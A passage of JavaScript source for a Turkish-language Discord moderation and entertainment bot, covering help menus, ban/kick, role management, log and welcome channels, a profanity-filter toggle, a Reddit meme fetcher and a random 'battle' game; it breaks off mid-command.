module.exports = (Canvas, chalk, Discord, randomPuppy, request, ytdl, fs, client, db, edb, prefix, sahip, token, distube, path,  got) => {

    client.on('message', async (message) => {
        const args = message.content.slice(prefix.length).trim().split(' ');
        const komut = args.shift().toLowerCase();
        const fot = client.users.cache.get('743579595860607086');
        if (!message.content.startsWith(prefix)) return;
        if (message.channel.type === "dm") {
          const embed = new Discord.MessageEmbed()
          .setDescription("Bu komutu sadece sunucularda kullanabilirsin <a:unlem:825146178503966770>")
          .setColor("RED")
          .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
          return message.channel.send(embed);
        }

        if (komut === "help" || komut === "yardım") {
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("BOT KOMUTLARI")
            .addFields(
              {name: `<a:yldz:825050096567451769> ${prefix}moderasyon`, value: "Moderasyon komutları listeler" },
              {name: `<a:yldz:825050096567451769> ${prefix}sesli`, value: "Sohbet komutlarını listeler" },
              {name: `<a:yldz:825050096567451769> ${prefix}eğlence`, value: "Eğlence komutlarını listeler"},
              {name: `<a:yldz:825050096567451769> ${prefix}müzik`, value: "Müzik komutlarını listeler"},
              {name: `<a:yldz:825050096567451769> ${prefix}metin`, value: "Metin mesajı komutlarını listeler"}
            )
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setAuthor( message.author.username, message.author.avatarURL())
            message.channel.send({embed:embed});
        }
        if (komut === "moderasyon" || komut === "moderasyon komutları") {
            const cizgi = "-----------------------------------------------------------------------  \n";
            const array = [
              `<a:ayar:822253985427488798> ${prefix}kur: Sıfırdan sunucu kurulumu yapar \n`,
              `<a:ayar:822253985427488798> ${prefix}ban: Seçilen kişiyi banlar \n`,
              `<a:ayar:822253985427488798> ${prefix}kick: Seçilen kişiyi sunucudan atar \n`,
              `<a:ayar:822253985427488798> ${prefix}unban: Seçilen kişinin banını kaldırır \n`,
              `<a:ayar:822253985427488798> ${prefix}davet: Yazılan kanal için sınırsız davet oluşturur \n`,
              `<a:ayar:822253985427488798> ${prefix}rol-ver: Seçilen kişiye seçilen rolü verir \n`,
              `<a:ayar:822253985427488798> ${prefix}rol-al: Seçilen kişiden seçilen rolü alır \n`,
              `<a:ayar:822253985427488798> ${prefix}gelen-giden: Sunucuya biri geldiğinde ve gittiğinde ayarlanan kanala mesaj atar \n`,
              `<a:ayar:822253985427488798> ${prefix}sayaç: Sunucuya birisi geldiğinde ve gittiğinde anlık üye sayısını söyler \n`,
              `<a:ayar:822253985427488798> ${prefix}log: Log kanalı ayarlar \n`,
              `<a:ayar:822253985427488798> ${prefix}oto-rol: Otorol ayarlama komutu \n`,
              `<a:ayar:822253985427488798> ${prefix}küfür-aç: Sunucunuzda küfür korumayı aktif edersiniz \n`,
              `<a:ayar:822253985427488798> ${prefix}küfür-kapat: Sunucunuzda küfür korumayı kapatırsınız \n`,
              `<a:ayar:822253985427488798> ${prefix}emoji-rol: İstenen kanal için emoji ile rol almayı etkinleştirir \n`,
              `<a:ayar:822253985427488798> ${prefix}emoji-rol-kaldır: Seçilen kanaldaki emoji ile rol almayı kapatır \n`,
              `<a:ayar:822253985427488798> ${prefix}bilgi: Sunucu hakkındaki bilgileri gösterir \n`,
              `<a:ayar:822253985427488798> ${prefix}veriler: Sunucuya ait veritabanındaki verileri gösterir \n`,
              `<a:ayar:822253985427488798> ${prefix}veri-sil: Sunucuya ait veritabanındaki bütün verileri temizler \n`,
              `<a:ayar:822253985427488798> ${prefix}kayıt: Kişileri kayıt etmenizi sağlar \n`,
              `<a:ayar:822253985427488798> ${prefix}sil: Seçildiği kadar mesajı temizler \n`
            ]
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Moderasyon Komutları")
            .setDescription(array)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setAuthor(message.author.username, message.author.avatarURL({ dynamic:true }))
            message.author.send({embed:embed})
    
            const embediki = new Discord.MessageEmbed()
            .setDescription("Sana Komutlarımı Özelden Gönderdim <a:ysltk:749379707556069457> ")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            message.reply(embediki);
        }
        if (komut === "ban") {
            if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")){
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Gerekli yetkiye sahip değilsin <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
             }

              let user = message.mentions.users.first();
              let member = message.guild.member(user);
              let reason = args.slice(1).join(" ");
          
              if (!user){
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Bir kullanıcı girmelisin <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
          }
              if (user.id === message.author.id){
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Kendini banlayamazsın <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
          }
              if (user.id === client.user.id) {
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Beni banlayamazsın <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
          }
              if (!reason) reason = "Bir sebep girilmedi";
          
              message.guild.members.ban(member).then(() => {
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription(`**${user.tag}** başarıyla banlandı`)
                .setTitle(`Moderasyon Sistemi`)
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                .setAuthor(message.author.username, message.author.avatarURL())
               return message.channel.send({embed:embed});
              }).catch(err => {
                message.reply("Bu kişiyi banlayamam");
              })
        }
        if (komut === "eğlence" || komut === "eğlence komutları") {
            const array = [
              `<a:oyunkonsolu:825046531312582729> ${prefix}meme: Burdurland den rastgele paylaşımlar gösterir \n`,
              `<a:oyunkonsolu:825046531312582729> ${prefix}savaş: Etiketlenen kişilere vs attırır \n`
            ]
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Eğlence Komutları")
            .setDescription(array)
            .setFooter("Yakında Devamı Gelecek... | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setAuthor( message.author.username,message.author.avatarURL({ dynamic:true }))
            message.author.send({embed:embed});
    
            const embediki = new Discord.MessageEmbed()
            .setDescription("Sana Komutlarımı Özelden Gönderdim <a:ysltk:749379707556069457> ")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            message.reply(embediki);
        }
        if (komut === "gelen-giden" || komut === "hoşgeldin-ayarla") {

          if (!message.member.hasPermission("ADMINISTRATOR") || !message.member.hasPermission("MANAGE_ROLES")) {
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setDescription("Gelen Giden kanalı ayarlamak için gerekli yetkiye sahip değilsin <a:unlem:825146178503966770>")
            .setTitle("Moderasyon Sistemi")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
           return message.channel.send({embed:embed});
        }

            let logkanalvarmı = db.has(`log-${message.guild.id}`);
            if (logkanalvarmı === true) {
              let kanalvarmı = db.has(`hoşgeldin-${message.guild.id}`);
              if (kanalvarmı === true) {
                const embed = new Discord.MessageEmbed()
                .setTitle("Moderasyon Sistemi")
                .setColor("RANDOM")
                .setDescription("Zaten bir gelen-giden kanalı ayarlı <a:unlem:825146178503966770>")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                message.channel.send({embed:embed});
              } else {
                let argümanbir = args[0];
                if (argümanbir.startsWith('<#') && argümanbir.endsWith('>')) {
                let kanalid = argümanbir.slice(2, -1);
      
                db.set(`hoşgeldin-${message.guild.id}`, kanalid);
      
                const embed = new Discord.MessageEmbed()
                .setTitle("Moderasyon Sistemi")
                .addFields(
                  {name: "Ayarlar Kaydedildi", value:`<#${kanalid}> kanalına gelen-giden mesajları ayarlandı`}
                )
                .setColor("RANDOM")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                message.channel.send({embed:embed});
      
              } else {
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setTitle("Moderasyon Sistemi")
                .setDescription("Gelen-giden kanalı ayarlamak için bir metin kanalı etiketlemelisiniz <a:unlem:825146178503966770>")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                message.channel.send({embed:embed});
              }
              }
      
            } else{
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Bir hoşgeldin kanalı ayarlamadan önce bir log kanalı ayarlamalısınız <a:unlem:825146178503966770>")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
        }
        if (komut === "kayıt") {
            if (message.guild.id === "759428109237092382") {
                const üye = '796294825191145472';
                const kullanıcı = args[0];
                const isim = args[1];
                const soyisim = args[2];
                const alınacakrol = '796397351211630612';
                const degistirilcekisim = `${isim} ${soyisim}`;
                const member = message.mentions.members.first();

              if (message.member.hasPermission("ADMINISTRATOR")){
                  member.setNickname(degistirilcekisim);
                  member.roles.remove(alınacakrol);
                  member.roles.add(üye);
            
                  const embed = new Discord.MessageEmbed()
                  .setTitle("Kayıt Sistemi")
                  .setDescription(`${kullanıcı} kullanıcısı kayıt edildi <a:ysltk:749379707556069457>`)
                  .setFooter("TSBL")
                  message.channel.send(embed);
              }
              else {
                const embed = new Discord.MessageEmbed()
                .setDescription("Bu komutu kullanabilmek için ADMİN yetkisine sahip olmalısın !!<a:unlem:825146178503966770>")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                .setTitle("Moderasyon Sistemi")
                return message.channel.send({embed:embed})
              }
            } else if (message.guild.id === "693202023767736370") {
    
              const registered = '760460939580932106';
              const kullanıcı = args[0];
              const isim = args[1];
              const soyisim = args[2];
              const alınacakrol = '802598102984556544';
              const degistirilcekisim = `${isim}`;
              const member = message.mentions.members.first();
            
            if (message.member.hasPermission("ADMINISTRATOR")){
                member.setNickname("[☬]"+ degistirilcekisim);
                member.roles.remove(alınacakrol);
                member.roles.add(registered);
            
                const embed = new Discord.MessageEmbed()
                .setTitle("Kayıt Sistemi")
                .setDescription(`${kullanıcı} kullanıcısı kayıt edildi <a:ysltk:749379707556069457>`)
                .setFooter("Moderasyon Sistemi")
                message.channel.send(embed);
            }
            
            else {
              const embed = new Discord.MessageEmbed()
              .setDescription("Bu komutu kullanabilmek için ADMİN yetkisine sahip olmalısın !!<a:unlem:825146178503966770>")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              .setTitle("Moderasyon Sistemi")
              return message.channel.send({embed:embed})
            }
            
            }
        }
        if (komut === "kick") {
            if (!message.member.hasPermission("KICK_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")){
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Gerekli yetkiye sahip değilsin <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
             }
              let user = message.mentions.users.first();
              let member = message.guild.member(user);
              let reason = args.slice(1).join(" ");
              
              if (!user){
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Bir kullanıcı girmelisin <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
          }
              if (user.id === message.author.id){
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Kendini kickleyemezsin <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
          }
              if (user.id === client.user.id) {
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Beni kickleyemezsin <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
          }
              if (!reason) reason = "Bir sebep girilmedi";
              member.kick(reason).then(() => {
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription(`**${user.tag}** başarıyla kicklendi`)
                .setTitle(`Moderasyon Sistemi`)
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
              }).catch(err => {
                message.reply("Bu kişiyi kickleyemem");
              })
        }
        if (komut === "küfür-aç") {
            if (message.member.hasPermission("ADMINISTRATOR")){
                const küfüraçıkmı = db.has(`küfür-${message.guild.id}`,"açık")
                if (küfüraçıkmı === true) {
                  const embed = new Discord.MessageEmbed()
                  .setDescription("Küfür Koruma Zaten Açık <a:unlem:825146178503966770>")
                  .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                  .setTitle("Moderasyon Sistemi")
                  return message.channel.send({embed:embed})
                }
                else {
                db.set(`küfür-${message.guild.id}`,"açık");
                const embed = new Discord.MessageEmbed()
                .setDescription("Küfür Koruma Aktif Edildi <a:ysltk:749379707556069457>")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                .setTitle("Moderasyon Sistemi")
                message.channel.send({embed:embed})
              }
              }
              else {
                const embed = new Discord.MessageEmbed()
                .setDescription("Bu komutu kullanabilmek için ADMİN yetkisine sahip olmalısın <a:unlem:825146178503966770>")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                .setTitle("Moderasyon Sistemi")
                return message.channel.send({embed:embed})
              }
        }
        if (komut === "küfür-kapat") {
          if (message.member.hasPermission("ADMINISTRATOR")){
            const küfüraçıkmı = db.has(`küfür-${message.guild.id}`,"açık")
            if (küfüraçıkmı === true) {
              db.delete(`küfür-${message.guild.id}`)
              const embed = new Discord.MessageEmbed()
              .setDescription("Küfür Koruma Kapatıldı <a:ysltk:749379707556069457>")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              .setTitle("Moderasyon Sistemi")
              return message.channel.send({embed:embed})
            }
            else {
              const embed = new Discord.MessageEmbed()
              .setDescription("Küfür Koruma Zaten Kapalı <a:unlem:825146178503966770>")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              .setTitle("Moderasyon Sistemi")
              return message.channel.send({embed:embed})
          }
          }
          else {
            const embed = new Discord.MessageEmbed()
            .setDescription("Bu komutu kullanabilmek için ADMİN yetkisine sahip olmalısın <a:unlem:825146178503966770>")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTitle("Moderasyon Sistemi")
            return message.channel.send({embed:embed})
          }
        }
        if (komut === "log") {

          if (!message.member.hasPermission("ADMINISTRATOR") || !message.member.hasPermission("MANAGE_ROLES")) {
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setDescription("Log kanalı ayarlamak için gerekli yetkiye sahip değilsin <a:unlem:825146178503966770>")
            .setTitle("Moderasyon Sistemi")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
           return message.channel.send({embed:embed});
        }

            let argümanbir = args[0];
            if (argümanbir.startsWith('<#') && argümanbir.endsWith('>')) {
            const kanalid = argümanbir.slice(2, -1)
            const kanal = message.guild.channels.cache.get(kanalid)
            let kanalvarmı = db.has(`log-${message.guild.id}`);
        
            if (kanalvarmı === true) {
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Zaten bir log kanalı ayarlı <a:unlem:825146178503966770>")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            } else {
        
            db.set(`log-${message.guild.id}`,`${kanalid}`)
        
              const embediki = new Discord.MessageEmbed()
              .setTitle("Moderasyon sistemi")
              .setDescription(`Log kanalı ${kanal} olarak ayarlandı`)
              .setColor("RANDOM")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embediki});
            }
          }else {
             const embed = new Discord.MessageEmbed()
             .setColor("RANDOM")
             .setDescription("Log kanalı ayarlamak için bir metin kanalını etiketlemelisiniz <a:unlem:825146178503966770>")
             .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
             return message.channel.send({embed:embed});
           }
        }
        if (komut === "meme") {
            const embed = new Discord.MessageEmbed()
            got('https://www.reddit.com/r/burdurland/random/.json').then(response => {
                let content = JSON.parse(response.body);
                let permalink = content[0].data.children[0].data.permalink;
                let memeUrl = `https://reddit.com${permalink}`;
                let memeImage = content[0].data.children[0].data.url;
                let memeTitle = content[0].data.children[0].data.title;
                let memeUpvotes = content[0].data.children[0].data.ups;
                let memeDownvotes = content[0].data.children[0].data.downs;
                let memeNumComments = content[0].data.children[0].data.num_comments;
                embed.setTitle(`${memeTitle}`)
                embed.setURL(`${memeUrl}`)
                embed.setImage(memeImage)
                embed.setColor('RANDOM')
                embed.setFooter(`👍 ${memeUpvotes} 👎 ${memeDownvotes} 💬 ${memeNumComments} | r/burdurland`)
                message.channel.send(embed).then(embedMessage => {
                    embedMessage.react("👍");
                    embedMessage.react("👎");
                });
            }) 
        }
        if (komut === "metin") {
            const array = [
              `<a:chatting:825048610840117339> sa \n`,
              `<a:chatting:825048610840117339> selam \n`,
              `<a:chatting:825048610840117339> naber \n`,
              `<a:chatting:825048610840117339> günaydın \n`,
              `<a:chatting:825048610840117339> iyi geceler \n`,
              `<a:chatting:825048610840117339> merhaba \n`,
              `<a:chatting:825048610840117339> seni kim yaptı \n`,
              `<a:chatting:825048610840117339> sende gül \n`,
              `<a:chatting:825048610840117339> instagram \n`,
              `<a:chatting:825048610840117339> aferin \n`
            ]
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Metin Komutları")
            .setDescription(array)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setAuthor( message.author.username,message.author.avatarURL({ dynamic:true }))
            message.author.send({embed:embed});
    
            const embediki = new Discord.MessageEmbed()
            .setDescription("Sana Komutlarımı Özelden Gönderdim <a:ysltk:749379707556069457> ")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            message.reply(embediki);
        }
        if (komut === "müzik") {
            const array = [
              `<a:mzknotas:825045623463346178> ${prefix}oynat: İstediğiniz müziği oynatmanızı sağlar \n`,
              `<a:mzknotas:825045623463346178> ${prefix}dur: Oynatılan müziği durdurur \n`,
              `<a:mzknotas:825045623463346178> ${prefix}geç: Sıradaki müziğe geçer \n`,
              `<a:mzknotas:825045623463346178> ${prefix}sıra: Sıraya alınan müzikleri gösterir \n`,
              `<a:mzknotas:825045623463346178> ${prefix}3d: Müziği 8D müzik haline getirir \n`
            ]
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Müzik Komutları")
            .setDescription(array)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setAuthor( message.author.username,message.author.avatarURL({ dynamic:true }))
            message.author.send({embed:embed})
    
            const embediki = new Discord.MessageEmbed()
            .setDescription("Sana Komutlarımı Özelden Gönderdim <a:ysltk:749379707556069457> ")
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            message.reply(embediki);
        }
        if (komut === "oto-rol" || komut === "otorol") {
            if (!message.member.hasPermission("ADMINISTRATOR") || !message.member.hasPermission("MANAGE_ROLES")) {
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setDescription("Otorol ayarlamak için gerekli yetkiye sahip değilsin <a:unlem:825146178503966770>")
                .setTitle("Moderasyon Sistemi")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
               return message.channel.send({embed:embed});
            } else{
                let otorolvarmı =  db.has(`otorol-${message.guild.id}`);
                if (otorolvarmı === true) {
                  const embed = new Discord.MessageEmbed()
                  .setTitle("Moderasyon Sistemi")
                  .setColor("RANDOM")
                  .setDescription("Zaten bir otorol ayarlı <a:unlem:825146178503966770>")
                  .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                  return message.channel.send({embed:embed});
                }else {
          
                let rol = args[0];
                if (rol.startsWith('<@&') && rol.endsWith('>')){
                var rolid = rol.slice(3, -1);
                let logkanalvarmı = db.has(`log-${message.guild.id}`);
                if (logkanalvarmı === true) {
                db.set(`otorol-${message.guild.id}` ,rolid)
                const embed = new Discord.MessageEmbed()
                .setTitle("Moderasyon Sistemi")
                .addFields(
                  {name: "Oto rol ayarlandı", value:`Otorol <@&${rolid}> olarak ayarlandı`}
                )
                .setColor("RANDOM")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                message.channel.send({embed:embed});
              } else {
                const embed = new Discord.MessageEmbed()
                .setTitle("Moderasyon Sistemi")
                .setColor("RANDOM")
                .setDescription("Bir otorol ayarlamadan önce bir log kanalı ayarlamalısınız <a:unlem:825146178503966770>")
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                message.channel.send({embed:embed});
              }
            } else {
              const embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setColor("RANDOM")
              .setDescription("Otorol ayarlamak için bir rol etiketlemelisiniz")
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            }
          
          }
        }
        if (komut === "ping") {
            const embed = new Discord.MessageEmbed()
            .addField("Botun gecikme süresi: ", `${client.ws.ping} MS`, true)
            .setColor("RADNOM")
            message.channel.send({embed:embed});
        }
        if (komut === "rol-al") {
            if(!message.guild) return message.author.send("Lütfen bu komutu sunucuda kullanın");
            if (message.author.bot === true) return;
            
            if (!message.member.hasPermission('ADMINISTRATOR')) {
              const embed = new Discord.MessageEmbed()
              .setDescription("Birinden Rol Alabilmek İçin Admin Yetkisine Sahip Olmalısın")
              .setColor("RANDOM")
              .setAuthor(message.author.tag, message.author.avatarURL({ dynamic:true }))
              .setFooter("Created by Saxquatchx |")
              .setTimestamp()
              message.channel.send(embed)
              return;
            }
            
            var kisi = args[0];
            if (kisi.startsWith('<@') && kisi.endsWith('>')) {
            const kisiid = kisi.slice(2, -1);
            var rol = args[1];
            if (rol.startsWith('<@&') && rol.endsWith('>')) {
            var rolID = rol.slice(3, -1);
            if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES"))  {
            return message.channel.send("Lütfen rol vermem için bana sunucuyu yönet yetkisi veriniz")
            }
            const member = message.mentions.members.first();
            member.roles.remove(rolID)
            var embed = new Discord.MessageEmbed()
            .setTitle("Moderasyon Sistemi")
            .setDescription(`<@${kisiid}> adlı kişiden ${rol} rolü alındı.`)
            .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setThumbnail("https://i.pinimg.com/originals/24/ba/77/24ba771a71c472d7c3dec96a9c47864a.jpg")
            .setAuthor( message.author.username,message.author.avatarURL())
            .setColor("BLACK");
            message.channel.send({embed:embed});
            
            } else {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setTitle("Moderasyon Sistemi")
              .setDescription(`<@${kisiid}> kişisinden rol almak için bir rol etiketlemelisiniz !`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              message.channel.send({embed:embed});
            }
            } else {
              const embed = new Discord.MessageEmbed()
              .setColor("RANDOM")
              .setTitle('Moderasyon Sistemi')
              .setDescription(`Rol almak için bir kişi etiketlemelisiniz !`)
              message.channel.send({embed:embed});
            }
        }
        if (komut === "rol-oluştur") {
            if(message.author.bot === true) {
                return;
            }
          
          
            if(!message.guild) {
              return message.channel.send("Lütfen özel mesajlarda bu komutu kullanmayınız.")
          }
          
          
          var rol = args[0];
          
          var renk = args[1];
          
          var yetkiargüman = args[2];
          
          if (!rol) {
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setDescription(`Lütfen rolün adını giriniz`)
            .setTitle('Moderasyon Sistemi')
            .setFooter('Created by Saxquatchx')
            message.channel.send({embed:embed});
          }
          if (!renk) {
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setDescription(`Lütfen rolün rengini`)
            .setTitle('Moderasyon Sistemi')
            .setFooter('Created by Saxquatchx')
            message.channel.send({embed:embed});
          }
          if (!yetki) {
            const embed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setDescription(`Lütfen rolün yetkilerini giriniz`)
            .setTitle('Moderasyon Sistemi')
            .setFooter('Created by Saxquatchx')
            message.channel.send({embed:embed});
          } else {
            var yetki = yetkiargüman.slice(',')
          
          
          if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES"))  {
          return message.channel.send("Lütfen rol oluşturmam için bana rolleri yönet yetkisi veriniz")
          }
          
          message.guild.createRole({
          name: rol,
          color: `${renk}`,
          permissions: `${yetki}`
          })
          
          for (var i = 0; i < yetki.length; i++) {
            var yetkiler = yetki[i]
          }
          
          var embed = new Discord.MessageEmbed()
          .setTitle("Moderasyon Sistemi")
          .setDescription(` ${rol} adlı rolünüz başarı ile oluşturuldu. `)
          .addFields(
            {name: "Rolün Yetkileri", value: `${yetkiler}\n`},
            {name: "Rolün Rengi", value: `${renk}`}
          )
          .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
          .setTimestamp()
          .setAuthor( message.author.username)
          .setColor(`${renk}`);
          message.channel.send({embed:embed});
          
          }
        }
        if (komut === "rol-ver") {
            if (!message.member.hasPermission('ADMINISTRATOR')) {
                const embed = new Discord.MessageEmbed()
                .setDescription("Birine Rol Verebilmek İçin Admin Yetkisine Sahip Olmalısın")
                .setColor("RANDOM")
                .setAuthor(message.author.tag, message.author.avatarURL({ dynamic:true }))
                .setFooter("Created by Saxquatchx |")
                .setTimestamp()
                message.channel.send(embed)
                return;
              }
              
              if (!message.author.id === "456948152101240847") {
                return;
              }
              
              if(!message.guild.member(client.user).hasPermission("MANAGE_GUILD"))  {
              return message.channel.send("Lütfen rol vermem için bana sunucuyu yönet yetkisi veriniz")
              }
              
              if(!message.guild){
                return message.author.send("Lütfen bu komutu sunucuda kullanın");
              }
              
              if (message.author.bot === true) {
                return;
              }
              
              var kisi = args[0];
              
              if (kisi.startsWith('<@') && kisi.endsWith('>')) {
              
              const kisiid = kisi.slice(2, -1);
              
              const member = message.mentions.members.first();
              
              var rol = args[1];
              
              if (rol.startsWith('<@&') && rol.endsWith('>')) {
              
              var rolID = rol.slice(3, -1);
              
              member.roles.add(rolID)
              
              var embed = new Discord.MessageEmbed()
              .setTitle("Moderasyon Sistemi")
              .setDescription(`<@${kisiid}> adlı kişiye <@&${rolID}> rolü verildi`)
              .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              .setTimestamp()
              .setAuthor( message.author.tag)
              .setColor("BLACK")
              message.channel.send({embed:embed})
              
              }else {
              
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setTitle("Moderasyon Sistemi")
                .setDescription(`<@${kisiid}> kişisie rol vermek için bir rol etiketlemelisiniz !`)
                .setFooter("Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
                message.channel.send({embed:embed});
              
              }
              
              }else {
                const embed = new Discord.MessageEmbed()
                .setColor("RANDOM")
                .setTitle('Moderasyon Sistemi')
                .setDescription(`Rol vermek için bir kişi etiketlemelisiniz !`)
                message.channel.send({embed:embed});
              }
        }
        if (komut === "savaş") {
                    //Gerekli Argümanlar Ve Değer Atamaları
        const rastgelesayi = Math.floor((Math.random() * 6) + 1);
        console.log(rastgelesayi);
        const birincikisi = args[0];
        const ikincikisi = args[1];
        const cevapbir = "Ezdi Geçti<a:unlem:825146178503966770>";
        const cevapiki = "Kazandı";
        const cevapüc = "Deşti";
        const cevapdort = "Tek Attı";
        const cevapbes = "Adeta Bir Ölüm Makinesi";
        const cevapalti = "Acımadı";

        //Kişi Mi Sorgulama

        if (!birincikisi.startsWith('<@') || !ikincikisi.startsWith('<@')) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**Bu komutu kullanmak için 2 kişiyi etiketlemelisin !**`)
            .addField("Şunun Gibi:", "Tsavaş @herhangibiri @herhangibiri")
            .setAuthor(message.author.tag, message.author.displayAvatarURL({ dynamic:true }))
            .setTimestamp()
            .setFooter("Created by Saxquatchx |", fot.avatarURL({ dynamic:true }))
            return message.channel.send(embed);
        }

        //İki Kişide Normal Değilse

        if (birincikisi.startsWith('<@!') && ikincikisi.startsWith('<@!')){ 
            const birincikisibol = birincikisi.slice(3,-1)
            const ikincikisibol = ikincikisi.slice(3,-1)
            //Kişileri Getirme
            const birincigetir = message.guild.members.cache.get(birincikisibol);
            const ikincigetir = message.guild.members.cache.get(ikincikisibol);
            //Asıl Olayımıza Gelelim
        if (rastgelesayi > 0 && rastgelesayi < 2) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`**${birincigetir} ${cevapbir}**`)
